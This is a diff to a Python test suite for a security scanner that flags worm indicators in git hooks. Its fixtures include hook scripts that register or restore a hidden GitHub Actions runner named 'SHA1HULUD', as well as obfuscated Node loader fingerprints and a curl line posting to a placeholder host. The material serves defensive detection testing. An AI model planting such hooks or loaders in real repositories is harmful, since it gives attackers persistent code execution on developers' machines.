@@ -5,12 +5,13 @@ from __future__ import annotations
 
 import os
 import stat
+import unittest
 import uuid
 from pathlib import Path
 from unittest import mock
 
 from stayawake.bots.security.matchers.git_exec_surface import (PAYLOAD_SIGNATURE, RUNS_SIGNATURE,
-                                                               SUSPICIOUS_SIGNATURE)
+                                                               SUSPICIOUS_SIGNATURE, payload_check_for)
 from stayawake.bots.security.models import CONFIRMED, HEURISTIC, INFORMATIONAL
 from stayawake.bots.security.scanner import scan_target
 from stayawake.bots.security.signatures import load_signatures
@@ -658,6 +659,50 @@ class TestReadingNeverRunsTheConfiguration(ExecSurfaceSandbox):
         self.assertTrue(tiers[INFORMATIONAL])
 
 
+_RUNNER_REGISTRATION = (
+    "#!/bin/sh\nRD=$HOME/.dev-env\ncd \"$RD\" && ./config.sh --url https://github.com/o/r --unattended "
+    "--token \"$RUNNER_TOKEN\" --name \"SHA1HULUD\"\nnohup ./run.sh >/dev/null 2>&1 &\n")
+_RUNNER_RESTORED = (
+    "#!/bin/sh\nRD=$HOME/.dev-env\ncat > \"$RD/.runner\" <<'EOF'\n"
+    "{\"agentName\": \"build-agent-7\", \"serverUrl\": \"https://pipelines.actions.githubusercontent.com/x/\", "
+    "\"gitHubUrl\": \"https://github.com/o/r\", \"workFolder\": \"_work\"}\nEOF\n"
+    "cd \"$RD\" && nohup ./run.sh >/dev/null 2>&1 &\n")
+
+
+class TestAWormIndicatorInWhatGitRunsIsConfirmed(ExecSurfaceSandbox):
+
+    def test_a_hook_registering_the_worms_runner(self):
+        repo = self.repo()
+        self.hook(repo / ".git" / "hooks", "post-checkout", _RUNNER_REGISTRATION)
+        self.assertEqual("infected", self.assert_tier(repo, CONFIRMED)["result"].verdict)
+
+    def test_a_hook_restoring_a_runner_registration(self):
+        repo = self.repo()
+        self.hook(repo / ".git" / "hooks", "post-merge", _RUNNER_RESTORED)
+        self.assertEqual("infected", self.assert_tier(repo, CONFIRMED)["result"].verdict)
+
+
+class TestTheValueIsAKnownPayloadOnlyWhereTheFingerprintHolds(unittest.TestCase):
+    """The question the removal asks of a setting's own text."""
+
+    def setUp(self):
+        every = [s for group in load_signatures().values() for s in group]
+        self.carries_payload = payload_check_for(every, holding_anywhere=True)
+
+    def test_a_fingerprint_meant_for_some_files_does_not_hold(self):
+        for value in ("echo TechMono", "cat branch_structure.json", "./config.sh --name SHA1HULUD",
+                      "curl -d '{\"serverUrl\": \"https://ci.example.com\"}' https://h.example.com"):
+            with self.subTest(value=value):
+                self.assertIsNone(self.carries_payload(value))
+
+    def test_a_fingerprint_held_to_a_corroborator_holds_only_beside_it(self):
+        self.assertEqual("loader-fromcharcode-127",
+                         self.carries_payload("node -e \"eval(String.fromCharCode(127)+x)\""))
+        self.assertIsNone(self.carries_payload("node -e \"const DEL = String.fromCharCode(127)\""))
+
+    def test_a_fingerprint_that_holds_anywhere_holds(self):
+        self.assertEqual("loader-global-v-marker", self.carries_payload("node -e \"global['_V']='8-12';\""))
+
+
 if __name__ == "__main__":
-    import unittest
     unittest.main()
